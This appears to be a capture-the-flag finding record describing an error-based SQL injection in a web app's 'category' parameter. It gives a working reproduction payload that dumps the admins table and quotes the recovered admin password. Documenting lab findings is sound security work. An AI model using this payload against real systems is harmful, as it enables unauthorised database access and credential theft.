findings.title: SQL Injection in category parameter leading to admin credential disclosure
findings.description: The 'category' GET parameter in index.php is vulnerable to SQL injection. Error-based SQL injection was used to extract credentials from the admins table. The extracted admin credentials (admin:ONEverySecurePassword_!) were used to authenticate to admin.php, which returned the CTF flag.

reproduction.command: GET http://172.17.0.1:49941/?category=Nature' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM admins)))-- -
reproduction.expected: Error message containing admin credentials: admin:ONEverySecurePassword_!
